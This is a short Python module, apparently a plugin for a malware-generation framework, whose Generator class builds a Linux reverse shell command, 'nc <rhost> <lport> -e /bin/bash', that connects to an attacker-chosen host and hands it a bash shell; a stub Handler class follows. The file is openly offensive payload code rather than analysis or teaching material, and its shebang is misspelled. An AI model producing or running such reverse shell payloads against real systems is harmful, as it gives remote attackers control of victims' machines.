#!/usr/bn/env/python3
from venomsrc.malware.malwarebase import *

class Generator(MalwareGenerator):
    def __init__(self):
        self.info_dict = {
            "info": 'Linux reverse shell',
            "platforms": ["linux"],
            "listener": ["tcp"],
            "requirements": ["rhost", "lport"]
        }
        # add try here
        super().__init__(self.info_dict)

    def generate(self, option_dict: dict) -> bytes:
        for i in self.info_dict["requirements"]:
            if option_dict[i] == None:
                return "ERROR: Failed to validate " + i
        # function send file and recv file ?

        return ("nc " + option_dict["rhost"] + " " + option_dict["lport"] + " -e /bin/bash").encode()

class Handler(MalwareHandler):
    def __init__(self, writer, reader):  # Especificar tipo datos socket al pasarlo
        super().__init__(writer, reader)

    def isValid(self):
        pass

